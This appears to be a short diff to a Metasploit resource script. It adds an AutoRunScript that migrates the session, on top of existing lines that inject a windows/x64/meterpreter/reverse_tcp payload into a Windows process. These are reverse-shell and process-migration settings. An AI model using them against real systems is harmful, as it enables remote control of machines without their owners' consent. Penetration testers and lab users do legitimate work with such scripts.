@@ -1,4 +1,7 @@
+#auto run script
+set AutoRunScript post/windows/manage/migrate
 
+#migrate process
 use windows/local/payload_inject
 #migrate meterpreter to a 64 process if the system is 64 bit
 set payload windows/x64/meterpreter/reverse_tcp
